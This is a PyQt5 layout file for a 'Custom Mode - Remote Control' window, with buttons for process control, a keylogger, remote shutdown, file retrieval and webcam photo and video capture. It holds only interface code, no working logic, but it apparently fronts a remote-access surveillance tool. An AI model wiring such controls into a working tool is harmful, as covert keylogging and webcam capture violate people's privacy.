# -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_CustomModeWindow(object):
    def setupUi(self, CustomModeWindow):
        CustomModeWindow.setObjectName("CustomModeWindow")
        CustomModeWindow.resize(900, 700)
        CustomModeWindow.setWindowTitle("Custom Mode - Remote Control")

        self.centralwidget = QtWidgets.QWidget(CustomModeWindow)
        self.centralwidget.setObjectName("centralwidget")

        # Title label
        self.titleLabel = QtWidgets.QLabel(self.centralwidget)
        self.titleLabel.setGeometry(QtCore.QRect(0, 10, 900, 40))
        self.titleLabel.setWordWrap(True)
        font = QtGui.QFont()
        font.setPointSize(18)
        font.setBold(True)
        self.titleLabel.setFont(font)
        self.titleLabel.setAlignment(QtCore.Qt.AlignCenter)
        self.titleLabel.setText("CUSTOM MODE CONTROL PANEL")

        # Group box: App controls
        self.groupBoxApps = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxApps.setGeometry(QtCore.QRect(20, 60, 400, 160))
        self.groupBoxApps.setTitle("Apps Control")
        self.groupBoxApps.setObjectName("groupBoxApps")

        self.btnListApps = QtWidgets.QPushButton(self.groupBoxApps)
        self.btnListApps.setGeometry(QtCore.QRect(20, 30, 110, 35))
        self.btnListApps.setText("List Apps")

        self.btnStartApp = QtWidgets.QPushButton(self.groupBoxApps)
        self.btnStartApp.setGeometry(QtCore.QRect(150, 30, 110, 35))
        self.btnStartApp.setText("Start App")

        self.btnStopApp = QtWidgets.QPushButton(self.groupBoxApps)
        self.btnStopApp.setGeometry(QtCore.QRect(280, 30, 110, 35))
        self.btnStopApp.setText("Stop App")

        # Group box: Process controls
        self.groupBoxProcesses = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxProcesses.setGeometry(QtCore.QRect(20, 230, 400, 160))
        self.groupBoxProcesses.setTitle("Processes Control")
        self.groupBoxProcesses.setObjectName("groupBoxProcesses")

        self.btnListProcesses = QtWidgets.QPushButton(self.groupBoxProcesses)
        self.btnListProcesses.setGeometry(QtCore.QRect(20, 30, 110, 35))
        self.btnListProcesses.setText("List Processes")

        self.btnStartProcess = QtWidgets.QPushButton(self.groupBoxProcesses)
        self.btnStartProcess.setGeometry(QtCore.QRect(150, 30, 110, 35))
        self.btnStartProcess.setText("Start Process")

        self.btnStopProcess = QtWidgets.QPushButton(self.groupBoxProcesses)
        self.btnStopProcess.setGeometry(QtCore.QRect(280, 30, 110, 35))
        self.btnStopProcess.setText("Stop Process")

        # Group box: Keylogger
        self.groupBoxKeylogger = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxKeylogger.setGeometry(QtCore.QRect(20, 400, 400, 90))
        self.groupBoxKeylogger.setTitle("Keylogger")
        self.groupBoxKeylogger.setObjectName("groupBoxKeylogger")

        self.btnStartKeylogger = QtWidgets.QPushButton(self.groupBoxKeylogger)
        self.btnStartKeylogger.setGeometry(QtCore.QRect(30, 30, 150, 40))
        self.btnStartKeylogger.setText("Start Keylogger")

        self.btnStopKeylogger = QtWidgets.QPushButton(self.groupBoxKeylogger)
        self.btnStopKeylogger.setGeometry(QtCore.QRect(220, 30, 150, 40))
        self.btnStopKeylogger.setText("Stop Keylogger")

        # Group box: System control
        self.groupBoxSystem = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxSystem.setGeometry(QtCore.QRect(450, 60, 420, 120))
        self.groupBoxSystem.setTitle("System Control")
        self.groupBoxSystem.setObjectName("groupBoxSystem")

        self.btnRestart = QtWidgets.QPushButton(self.groupBoxSystem)
        self.btnRestart.setGeometry(QtCore.QRect(30, 40, 150, 50))
        self.btnRestart.setText("Restart")

        self.btnShutdown = QtWidgets.QPushButton(self.groupBoxSystem)
        self.btnShutdown.setGeometry(QtCore.QRect(230, 40, 150, 50))
        self.btnShutdown.setText("Shutdown")
        #self.btnSystemInfo = QtWidgets.QPushButton(self.groupBoxSystem)
        #self.btnSystemInfo.setGeometry(QtCore.QRect(30, 90, 350, 35))
        #self.btnSystemInfo.setText("Show System Info")

        # Group box: File control
        self.groupBoxFile = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxFile.setGeometry(QtCore.QRect(450, 200, 420, 120))
        self.groupBoxFile.setTitle("File Control")
        self.groupBoxFile.setObjectName("groupBoxFile")

        self.labelFilePath = QtWidgets.QLabel(self.groupBoxFile)
        self.labelFilePath.setGeometry(QtCore.QRect(20, 30, 380, 20))
        self.labelFilePath.setText("File path:")

        self.lineEditFilePath = QtWidgets.QLineEdit(self.groupBoxFile)
        self.lineEditFilePath.setGeometry(QtCore.QRect(20, 55, 380, 30))

        self.btnGetFile = QtWidgets.QPushButton(self.groupBoxFile)
        self.btnGetFile.setGeometry(QtCore.QRect(140, 90, 150, 25))
        self.btnGetFile.setText("Get File Content")

        # Group box: Webcam control
        self.groupBoxWebcam = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBoxWebcam.setGeometry(QtCore.QRect(450, 350, 420, 160))
        self.groupBoxWebcam.setTitle("Webcam Control")
        self.groupBoxWebcam.setObjectName("groupBoxWebcam")

        self.btnCapturePhoto = QtWidgets.QPushButton(self.groupBoxWebcam)
        self.btnCapturePhoto.setGeometry(QtCore.QRect(30, 40, 150, 40))
        self.btnCapturePhoto.setText("Capture Photo")

        self.btnRecordVideo = QtWidgets.QPushButton(self.groupBoxWebcam)
        self.btnRecordVideo.setGeometry(QtCore.QRect(230, 40, 150, 40))
        self.btnRecordVideo.setText("Record Video")

        self.labelRecordSec = QtWidgets.QLabel(self.groupBoxWebcam)
        self.labelRecordSec.setGeometry(QtCore.QRect(30, 100, 130, 30))
        self.labelRecordSec.setText("Record duration (s):")

        self.spinBoxRecordSec = QtWidgets.QSpinBox(self.groupBoxWebcam)
        self.spinBoxRecordSec.setGeometry(QtCore.QRect(160, 100, 60, 30))
        self.spinBoxRecordSec.setRange(1, 60)
        self.spinBoxRecordSec.setValue(5)

        # Text edit for output
        self.textEditOutput = QtWidgets.QTextEdit(self.centralwidget)
        self.textEditOutput.setGeometry(QtCore.QRect(20, 480, 850, 180))
        self.textEditOutput.setReadOnly(True)
        fontOutput = QtGui.QFont()
        fontOutput.setPointSize(10)
        self.textEditOutput.setFont(fontOutput)

        CustomModeWindow.setCentralWidget(self.centralwidget)

        # Menubar and statusbar
        self.menubar = QtWidgets.QMenuBar(CustomModeWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 900, 21))
        CustomModeWindow.setMenuBar(self.menubar)

        self.statusbar = QtWidgets.QStatusBar(CustomModeWindow)
        CustomModeWindow.setStatusBar(self.statusbar)

        QtCore.QMetaObject.connectSlotsByName(CustomModeWindow)
